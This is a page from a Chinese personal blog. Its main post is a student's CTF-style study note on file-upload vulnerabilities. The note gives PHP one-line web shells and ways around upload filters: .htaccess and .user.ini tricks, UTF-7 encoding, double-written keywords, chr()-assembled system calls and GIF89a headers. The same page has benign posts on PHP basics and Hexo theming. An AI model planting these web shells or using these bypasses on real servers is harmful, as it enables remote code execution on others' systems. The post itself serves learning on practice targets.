<h1 id="做了十一道简单题，难的暂时还不会做，还得继续学习，题目虽然简单，但也花了有段时间，就当作熟悉一下解题的流程。"><a href="#做了十一道简单题，难的暂时还不会做，还得继续学习，题目虽然简单，但也花了有段时间，就当作熟悉一下解题的流程。" class="headerlink" title="做了十一道简单题，难的暂时还不会做，还得继续学习，题目虽然简单，但也花了有段时间，就当作熟悉一下解题的流程。"></a>做了十一道简单题，难的暂时还不会做，还得继续学习，题目虽然简单，但也花了有段时间，就当作熟悉一下解题的流程。</h1></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">文件上传漏洞学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-24</time><div class="content"><h1 id="文件上传漏洞学习及靶机练习"><a href="#文件上传漏洞学习及靶机练习" class="headerlink" title="文件上传漏洞学习及靶机练习"></a>文件上传漏洞学习及靶机练习</h1><p>文件上传漏洞顾名思义就是利用文件上传将恶意代码植入服务器中，因此如果不够安全将会导致严重的后果</p>
<h2 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h2><p>当服务器上传使用黑名单机制时，不让php后缀的文件上传，这时就可以用.htaccess文件重新配置当前文件的后缀解析为其他后缀。<br><strong>将后缀aaa解析为php</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>

<h2 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h2><ul>
<li>当&lt;?php被过滤时可使用短标签绕过，以题目upload2为例</li>
</ul>
<p><strong>当上传一个php文件时，如图</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB96c11bc1fb08af2b2e56b6f57e23edac?method=download&shareKey=9f62546d1057ac8f0cc8a4c9e9547da6"><br><strong>用&lt;?时也无法上传，此时想到js风格，试一下。</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB655ddbdc8224dc9acb629f8c237c890d?method=download&shareKey=ef82e7a507ff6e40c7216d3caef073a6"></p>
<p><strong>成功上传，代码如下</strong><br><strong>一句话木马</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><strong>用蚁剑拿到flag</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB90bd2d9c0ee321b892f9611d1f21dfb3?method=download&shareKey=8e14989122ff7b637d0a47527ee08000"></p>
<h2 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h2><ul>
<li>当php所有形式均被过滤掉时考虑使用特殊编码绕过，以题目upload4为例</li>
</ul>
<p><strong>当以&lt;?php形式上传时，如图所示不允许上传php文件</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB5eadc6313c0bcc1252fe73b2bcaefc76?method=download&shareKey=18c0c1889db0f5876606989312c28bb1"></p>
<p><strong>将&lt;?php去掉，显示上传成功，可知不能出现&lt;?</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB9837889e6bd08489b4a3d18d08b001fc?method=download&shareKey=64e577567542cc7d91b42f20c6a10ce9"></p>
<p><strong>此时可以用特殊编码绕过，将一句话木马解码UTF-7，<a target="_blank" rel="noopener" href="https://www.novel.tools/encode/UTF-7">UTF-7编码和解码</a>，如图</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEBb3469360a31d857e636ef90c5a5a38e8?method=download&shareKey=8bef2e4a29539c00fafa767be4500cd5"></p>
<p><strong>编码后代码如下</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure>
<p><strong>用蚁剑成功拿下flag</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB055259bf2cb9d90c2a816c1099c041be?method=download&shareKey=e25abf6ea2496b6e20ead338fb6882aa"></p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><ul>
<li>当上传文件中php,post,eval均被替换成空时可用，以题目upload3为例</li>
</ul>
<p><strong>首先上传一句话木马，如图php,post,eval均被替换成空。</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEBd899c6f7531e7e59cd45421acc72bef8?method=download&shareKey=6816c93e9397e3076e38e7b8ed7708f7"></p>
<p><strong>双写绕过后，成功上传如图</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB1ccc34ffd6ae560bcf8285ee377338d7?method=download&shareKey=c02e53a2b1d45a3742fc17f8fe101aa9"></p>
<p><strong>双写</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp @eevalval($_PPOSTOST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>此时记得修改.htaccess，在做这道题时花费了很长时间，经师兄提醒才知道此处忘改了</strong><br><strong>修改后</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure>

<h2 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h2><ul>
<li>假如.htaccess被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure></li>
<li>.user.ini<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.aaa</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h2><ul>
<li>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</li>
</ul>
<p><strong>以upload6为例，当上传.htaccess时如图显示内容不能有application.</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEBfd994b3cc64f177e0ce47f84021dc263?method=download&shareKey=d96168b7e40b01e33cccda0a9b13f1c1"></p>
<p><strong>将.htaccess文件换行绕过</strong><br><strong>换行绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\ </span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
<p><strong>再上传一次，成功</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB930ac90292b1d251e90545e81ad9c3ca?method=download&shareKey=c487087315f4f3b8d8bf934b52ebc420"></p>
<p><strong>用蚁剑拿下flag</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEBa5a4a48cf9342febed002e510ee284f8?method=download&shareKey=6fd0ab77ee55af6769b3e986ee0e3c04"></p>
<h2 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h2><ul>
<li>当服务器将危险函数过滤时，则考虑使用aiisc码拼接动态构造函数来绕过。</li>
</ul>
<p><strong>以upload7为例，同样先上传一句话木马试试，如图显示不能含有危险函数</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEBbd38778f1b1bbd75058f2833fca75a77?method=download&shareKey=4bb80621518920f4ae73bc4b112456c9"></p>
<p><strong>用bp抓包发现eval和post被过滤，尝试使用动态拼接函数绕过函数过滤，发现上传成功。</strong><br><img src="https://note.youdao.com/yws/api/personal/file/WEB2dfbaa8a3ef5688ebf935c77d97e0129?method=download&shareKey=5094ef3769b67d1d14de5de8048092a5"></p>
<p><strong>输出system</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(&#39;cat &#x2F;flag&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>成功拿到flag</strong></p>
<h2 id="图片头绕过"><a href="#图片头绕过" class="headerlink" title="图片头绕过"></a>图片头绕过</h2><p>顾名思义即伪装成图片被识别，绕过检测</p>
<ul>
<li>最简单的就是GIF89a法</li>
</ul>
<p><strong>在phpphp马最前面写入GIF89a</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111); $a(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>XBM文件头绕过</li>
</ul>
<p><strong>在刚开始做题中遇到了许许多多的问题，庆幸的是最后都一一解决了，在这个过程中受益匪浅，也十分感谢在这个过程中帮助我的师兄和同学。</strong></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/18/PHP%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">PHP基本语法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-18</time><div class="content"><h1 id="PHP基本语法学习"><a href="#PHP基本语法学习" class="headerlink" title="PHP基本语法学习"></a>PHP基本语法学习</h1><h2 id="php是一种通用开源脚本语言，与c语言类似，学习起来也不是那么困难"><a href="#php是一种通用开源脚本语言，与c语言类似，学习起来也不是那么困难" class="headerlink" title="php是一种通用开源脚本语言，与c语言类似，学习起来也不是那么困难"></a>php是一种通用开源脚本语言，与c语言类似，学习起来也不是那么困难</h2><ul>
<li>首先php文件都是以是以.php结尾的，php脚本以’,?php’开头，以’?&gt;’结尾<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo&quot;hello world!&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
  <img src="https://note.youdao.com/yws/api/personal/file/WEBc4ada78fe5b93ef09b689c39d9716d5d?method=download&shareKey=5762d31f446c60f2f57f916d49c5f446"><br>  与c语言十分类似，在每条语句后以；结尾，但不同的是php最后一行可以不用<br>这是其中最常见的风格，还有短标签风格，asp风格，JavaScript风格等等，分别如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script languange&#x3D;&quot;php&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul>
<li>注释与c语言基本一样<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php&#x2F;&#x2F;这是单行注释</span><br><span class="line">    echo&quot;hello world!&quot;&#x2F;*这是多行注释*&#x2F;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   function 函数名() &#123;</span><br><span class="line">  &#x2F;&#x2F;这里写代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul>
<li>php变量都以$开头，后跟下划线或字母，不能跟数字，这点与c语言类似。</li>
<li>变量对字母大小写敏感，需要注意。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $name&#x3D;&#39;zyt&#39;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>全局变量，使用global<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function 函数名() &#123;</span><br><span class="line">   global $</span><br><span class="line">   &#x2F;&#x2F;代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="常用的输出方式"><a href="#常用的输出方式" class="headerlink" title="常用的输出方式"></a>常用的输出方式</h2><ul>
<li>前文的”echo”输出字符串</li>
<li>print_r()输出复杂数据类型</li>
<li>var_dump()输出详细信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $arr &#x3D;array(1,2,&#39;123&#39;);</span><br><span class="line">  echo&#39;123&#39;;</span><br><span class="line">  print_r($arr);</span><br><span class="line">  var_dump($arr)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
  以此为例看看结果<br>  <img src="https://note.youdao.com/yws/api/personal/file/WEB4ad63fa4b5172ae9e6cebebf43331d8b?method=download&shareKey=20342def0ab34d0a96457751064e38e1"></li>
</ul>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>php中的运算符与c语言基本一致</p>
<ul>
<li>算数运算符：+、-、/、*、%</li>
<li>赋值运算符：x=y等等<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$x &#x3D; 5;</span><br><span class="line">	$y &#x3D; 3;</span><br><span class="line"></span><br><span class="line">	echo ($x + $y);</span><br><span class="line">	echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	echo ($x - $y);</span><br><span class="line">	echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	echo ($x * $y);</span><br><span class="line">	echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	echo ($x &#x2F; $y);</span><br><span class="line">	echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">	echo ($x % $y);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
  <img src="https://note.youdao.com/yws/api/personal/file/WEB0ffbd812b2982aeb180001f07eaa99cd?method=download&shareKey=dadfbbb75b7ef2d8ab8573e788a5f710"><br>  用C语言中的’\n’换行无效，需要用’<br />‘进行换行。</li>
</ul>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul>
<li>for循环<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for () &#123;</span><br><span class="line">	  echo &quot;&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="php中的基本http协议"><a href="#php中的基本http协议" class="headerlink" title="php中的基本http协议"></a>php中的基本http协议</h2><ul>
<li>GET<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_GET[&#39;a&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
<li>POST<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_POST[&#39;a&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
$_GET，$_POST都为关系型数组<br>没理解错的话这应该就是传参，还没搞太明白</li>
</ul>
<p><strong>以上是简单的php语法学习，学习资料来自各路大神，十分感谢</strong><br><strong>php还有许多值得学习的东西，还需要继续努力，学习笔记留待学习更新</strong></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/14/%E5%A6%82%E4%BD%95%E4%B8%BAhexo%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98/">如何为hexo更换主题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-14</time><div class="content"><h1 id="如何为hexo更换主题"><a href="#如何为hexo更换主题" class="headerlink" title="如何为hexo更换主题"></a>如何为hexo更换主题</h1><p>hexo自带的主题比较普通，如果说想让自己的blog比较有特色的话，可以换自己喜欢的主题。</p>
<h2 id="寻找主题"><a href="#寻找主题" class="headerlink" title="寻找主题"></a>寻找主题</h2><p>寻找自己喜欢的主题最简便的方法就是到hexo的主题页找<br><a target="_blank" rel="noopener" href="https://hexo.io/themes/">hexo官方主题</a><br>也可以自行用搜索引擎搜索</p>
<h2 id="下载并配置主题"><a href="#下载并配置主题" class="headerlink" title="下载并配置主题"></a>下载并配置主题</h2><p>这里以melody主题为例</p>
<ol>
<li>找到该主题仓库地址并复制，如图<br> <img src="https://note.youdao.com/yws/api/personal/file/WEBa099c139846d68af2c0dddda8a1a377d?method=download&shareKey=079fe6a172ee1db8e35703a946232beb" alt="仓库地址"></li>
<li>打开git命令窗口并输入如图指令<br> <img src="https://note.youdao.com/yws/api/personal/file/WEB7cfc1d7c70ac5e6ff44f7757f7ebd16f?method=download&shareKey=c8dd6a225c81043c2c858468d1938240"><br> 注意：需在仓库后加上themes/melody</li>
<li>更改配置文件<br> 更改根目录下配置文件_config.yml ,修改主题名即可，如图<br> <img src="https://note.youdao.com/yws/api/personal/file/WEBa2235c956bce7677cf0a0a64b13a4d88?method=download&shareKey=4e16494cbe7c1d1601f817f19f4b3761"></li>
<li>更新并发布主题<br> 按照顺序分别输入如下指令<br> <img src="https://note.youdao.com/yws/api/personal/file/WEB426bcfb0a6ed100a684df4a2b2dfdebf?method=download&shareKey=eb7f4cc92d2da349cfeea4eb866ee82f"><br> <img src="https://note.youdao.com/yws/api/personal/file/WEBba33f8e1da0047be10623eb4ad978d7d?method=download&shareKey=7cf0d48c7a42f58bd22df6e409224ecd"><br> <img src="https://note.youdao.com/yws/api/personal/file/WEBbb6c01be2c6d31fbfa085f81f2b288dd?method=download&shareKey=81c5700aa2b1c182b6f4d20a867140d5"></li>
<li>至此大功告成，打开看看效果<br> <img src="https://note.youdao.com/yws/api/personal/file/WEBf657a2180a06cc8ae751c65f2254669d?method=download&shareKey=4c21d7e0018e3c478a19bf1305997caa"></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/10/10/hello-world/">Hello World</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-10</time><div class="content"><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By YTsang</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>